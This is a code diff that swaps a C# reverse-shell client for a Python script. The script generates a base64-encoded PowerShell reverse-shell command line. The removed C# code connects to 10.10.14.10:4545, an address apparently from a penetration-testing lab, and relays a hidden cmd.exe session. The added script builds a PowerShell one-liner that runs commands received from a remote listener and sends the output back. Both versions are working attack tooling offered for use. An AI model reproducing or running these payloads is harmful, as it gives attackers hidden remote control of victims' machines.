@@ -1,66 +1,27 @@
-using System;
-using System.Text;
-using System.IO;
-using System.Diagnostics;
-using System.ComponentModel;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
+#!/usr/bin/env python3
+#
+# generate reverse powershell cmdline with base64 encoded args
+#
 
-namespace ConnectBack
-{
-    public class Program
-    {
-        static StreamWriter streamWriter;
+import sys
+import base64
 
-        public static void Main(string[] args)
-        {
-            using (TcpClient client = new TcpClient("10.10.14.10", 4545))
-            {
-                using (Stream stream = client.GetStream())
-                {
-                    using (StreamReader rdr = new StreamReader(stream))
-                    {
-                        streamWriter = new StreamWriter(stream);
+def help():
+    print("USAGE: %s IP PORT" % sys.argv[0])
+    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to 10.10.14.10:8888")
+    exit()
+    
+try:
+    (ip, port) = (sys.argv[1], int(sys.argv[2]))
+except:
+    help()
 
-                        StringBuilder strInput = new StringBuilder();
+# payload from Nikhil Mittal @samratashok
+# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
 
-                        Process p = new Process();
-                        p.StartInfo.FileName = "cmd";
-                        p.StartInfo.CreateNoWindow = true;
-                        p.StartInfo.UseShellExecute = false;
-                        p.StartInfo.RedirectStandardOutput = true;
-                        p.StartInfo.RedirectStandardInput = true;
-                        p.StartInfo.RedirectStandardError = true;
-                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-                        p.Start();
-                        p.BeginOutputReadLine();
+payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+payload = payload % (ip, port)
 
-                        while (true)
-                        {
-                            strInput.Append(rdr.ReadLine());
-                            p.StandardInput.WriteLine(strInput);
-                            strInput.Remove(0, strInput.Length);
-                        }
-                    }
-                }
-            }
-        }
+cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 
-        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-        {
-            StringBuilder strOutput = new StringBuilder();
-
-            if (!String.IsNullOrEmpty(outLine.Data))
-            {
-                try
-                {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
-                }
-                catch (Exception err) { }
-            }
-        }
-    }
-}
+print(cmdline)
